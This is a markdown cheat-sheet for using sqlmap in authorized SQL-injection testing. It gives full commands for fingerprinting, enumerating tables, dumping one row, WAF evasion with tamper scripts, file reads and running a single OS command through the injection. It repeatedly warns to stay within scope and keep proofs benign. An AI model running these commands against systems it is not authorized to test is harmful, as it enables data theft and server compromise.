# `sqlmap` cheat-sheet — confirm & characterize (authorized, PoC-safe)

Once you've **confirmed SQLi by hand** (context + DBMS + a controlled query change — §21), use sqlmap to *confirm,
fingerprint, and characterize* the bug for the report. sqlmap is the best exploiter on earth, but triagers reject
"sqlmap said so" with no hand proof, and an unbounded run is **loud and can corrupt data**. Stay PoC-safe.
See `../SQL_INJECTION_TESTING_GUIDE.md` §27.

> Authorized testing only. **Benign proof** (version, current user/db, one table, one column). **No** blanket `--dump`
> on production. **No** `--risk 3` on production (it issues stacked-query WRITES). **No** `--os-shell` on a bounty
> target — capture a single `whoami` if RCE is in scope, then stop.

## Install
```bash
# Kali ships it; otherwise:
pip install sqlmap        # or: git clone https://github.com/sqlmapproject/sqlmap
```

## The reliable way: feed it a saved request (carries cookies/headers/body)
```bash
# Save the request from Burp (right-click → Copy to file) as req.txt, then:
sqlmap -r req.txt -p id --batch                       # -p = the param you already suspect
sqlmap -r req.txt -p id --batch --level=2 --risk=1    # start gentle; raise ONLY as needed
```
A saved request is far more reliable than `-u` for authenticated/complex endpoints (it replays exact state).

## Confirm + fingerprint (start here)
```bash
sqlmap -r req.txt -p id --batch --banner --current-user --current-db --is-dba --hostname
#   --banner       DBMS version (your clean PoC string)
#   --current-user / --current-db    proves arbitrary read scope
#   --is-dba       are we DBA/superuser? (decides RCE/file reach)
```

## Pick technique / DBMS explicitly (faster, less noisy)
```bash
sqlmap -r req.txt -p id --batch --dbms=mysql --technique=BEUST
#   B boolean  E error  U union  S stacked  T time   (drop the ones you don't want; T is slowest/loudest)
sqlmap -r req.txt -p id --batch --technique=U --union-cols=2     # if you already know the column count (§9)
```

## Enumerate WITHOUT mass-dumping (PoC-safe)
```bash
sqlmap -r req.txt -p id --batch --dbs                 # list databases
sqlmap -r req.txt -p id --batch -D shopdb --tables    # list tables in one db
sqlmap -r req.txt -p id --batch -D shopdb -T users --columns
# prove read with ONE column / ONE row instead of the whole table:
sqlmap -r req.txt -p id --batch -D shopdb -T users -C username --start=1 --stop=1 --dump
```
For a bounty, the DBMS version + `current_user` + a table/column listing + one row already proves "arbitrary read."
**Avoid** `--dump` (whole table) / `--dump-all` on production.

## Targeted contexts
```bash
# JSON body:           sqlmap -r req.txt --batch    (it parses JSON; mark the value with * if needed)
# specific JSON/param: put a * at the injection point in req.txt   e.g.  {"id":"1*"}
# header injection:    sqlmap -u URL --headers="X-Forwarded-For: 1*" --batch
# cookie:              sqlmap -u URL --cookie="sid=...; pref=1*" --level=2 --batch
# ORDER BY / sort:     sqlmap can't always reach identifier context — confirm §5.4 by hand
```

## WAF evasion (try minimal first)
```bash
sqlmap -r req.txt --batch --random-agent --tamper=space2comment,between,charencode
# useful tampers: space2comment, between, charencode, randomcase, versionedmorekeywords,
#                 modsecurityversioned, equaltolike, percentage(MSSQL)
sqlmap -r req.txt --batch --delay=1 --time-sec=8        # pace + raise time threshold on jittery targets
```

## File read / RCE (only if in scope; benign proof, then STOP)
```bash
sqlmap -r req.txt --batch --file-read=/etc/hostname        # benign file to prove read (§14)
sqlmap -r req.txt --batch --os-cmd="whoami"                # ONE benign command if RCE is in scope (§16)
#   --os-shell drops an interactive shell — do NOT do this on a bounty target; --os-cmd "whoami" proves it.
```

## Useful flags
```
--batch            non-interactive (accept defaults)        --flush-session   re-test from scratch
--threads=2..4     parallelism (keep low to stay quiet)     -v 3              show the payloads it sends (learn from them)
--proxy=http://127.0.0.1:8080   route through Burp to SEE/replay the exact requests
--technique=BT     restrict to boolean+time (skip stacked writes entirely → safest on prod)
```
> **Quality gate:** sqlmap *confirms and characterizes*; your report must still show a **hand-reproduced** query change
> (version via UNION/error, a stable true/false, or a controlled delay). Route sqlmap `--proxy` through Burp so you can
> copy the exact winning request into your report. Pace it — blind/time runs are request-heavy and trip SIEM (§27).
